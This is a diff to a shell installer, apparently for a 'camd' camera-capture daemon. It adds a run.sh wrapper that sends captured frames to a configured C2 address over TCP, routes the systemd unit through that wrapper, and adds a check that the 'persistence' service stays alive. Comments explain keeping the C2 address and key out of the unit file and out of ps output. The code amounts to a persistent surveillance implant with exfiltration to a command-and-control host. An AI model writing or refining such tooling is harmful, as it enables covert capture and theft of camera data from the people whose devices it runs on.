@@ -169,6 +169,38 @@ install_bin() {
     return 0
 }
 
+install_runner() {
+    # 单元里不能依赖 $VAR 展开（真 systemd 实测踩出来的）：
+    #
+    #   ExecStart=$BIN_DST --sink tcp://$C2_ADDR --backend $CAMD_BACKEND
+    #
+    # systemd 249 下，ExecStart 行中的 $C2_ADDR **不会**被 EnvironmentFile
+    # 的值替换——EnvironmentFile 是 exec 时才注入子进程环境，不参与单元
+    # 解析期的命令行展开。sink 因此变成字面 "tcp://"（空地址），
+    # cam_daemon_run 返回 -4，camd 退出码 5，Restart=always 每 10 秒拉起
+    # 一次，陷入无限重启循环。
+    #
+    # 而 systemctl restart 返回 0、enable 成功、部署侧全绿（enabled +
+    # restarted）——服务从未真正跑起来过，一帧都没采。判据错在"restart 的
+    # 退出码"，见 persist_systemd 里的存活判据。
+    #
+    # 用 wrapper 在运行时从 conf 取值再 exec，是唯一既不在单元文件(0644)
+    # 里写 C2 地址/密钥、又能把参数正确传给 camd 的做法。
+    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
+    cat > "$LIB_DIR/run.sh" <<'RUNEOF' || DIE "写 run.sh 失败"
+#!/bin/sh
+# 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
+set -a
+. /etc/camd/camd.conf
+set +a
+[ -n "$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
+exec /usr/local/bin/camd --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"
+RUNEOF
+    chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
+    OK "启动器已写入 $LIB_DIR/run.sh（0700）"
+    return 0
+}
+
 render_unit() {
     # 单元文件在任何环境都渲染并送 systemd-analyze 校验，与"是否安装"解耦。
     #
@@ -185,7 +217,7 @@ After=network.target
 [Service]
 Type=simple
 EnvironmentFile=$CONF_FILE
-ExecStart=$BIN_DST --sink tcp://\$C2_ADDR --backend \$CAMD_BACKEND
+ExecStart=$LIB_DIR/run.sh
 Restart=always
 RestartSec=10
 NoNewPrivileges=true
@@ -234,7 +266,22 @@ persist_systemd() {
         && systemctl restart camd.service >/dev/null 2>&1 \
         || { rm -f "$UNIT"; systemctl daemon-reload >/dev/null 2>&1; \
              DIE "systemd 驻留失败（单元已回滚）"; }
-    OK "systemd 驻留成功（enabled + restarted）"
+    # 存活判据（真 systemd 实测踩出来的）：restart 返回 0 **不代表服务活着**。
+    # 单元参数错误时 camd 立刻退出，Restart=always 每 RestartSec 拉起一次，
+    # 服务处于 "activating (auto-restart)"：enable 成功、restart 返回 0、
+    # 部署侧全绿，而实际一帧都没采集，还留下密集的失败 journal。
+    # 判据必须是"重启后仍 active 且 MainPID 非 0"。
+    sleep 3
+    A=$(systemctl is-active camd.service 2>/dev/null)
+    M=$(systemctl show -p MainPID --value camd.service 2>/dev/null)
+    if [ "$A" != "active" ] || [ -z "$M" ] || [ "$M" = "0" ]; then
+        J=$(journalctl -u camd.service -n 5 --no-pager 2>/dev/null | tail -5)
+        systemctl disable --now camd.service >/dev/null 2>&1
+        rm -f "$UNIT"
+        systemctl daemon-reload >/dev/null 2>&1
+        DIE "systemd 驻留后服务未存活（active=$A MainPID=$M）: ${J:-无 journal}"
+    fi
+    OK "systemd 驻留成功（enabled + active, pid=$M）"
     return 0
 }
 
@@ -318,6 +365,7 @@ do_install() {
     extract_bin
     write_conf
     install_bin
+    install_runner
     render_unit
     if [ "$HAVE_SYSTEMD" = 1 ]; then
         persist_systemd
